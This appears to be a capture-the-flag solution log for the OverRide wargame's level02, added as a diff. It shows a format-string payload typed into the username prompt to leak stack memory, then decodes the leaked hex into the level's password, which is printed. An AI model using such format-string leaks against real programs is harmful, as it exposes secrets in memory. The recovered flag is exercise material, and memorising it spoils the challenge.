@@ -1,0 +1,16 @@
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %22$p%23$p%24$p%25$p%26$p
+--[ Password:
+*****************************************
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
+
+echo 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d | xxd -r -p
+unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+
+unPR47hH EAJ5as9Q 7zqCWNgX 5J5hnGXs H3gPfK9M
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
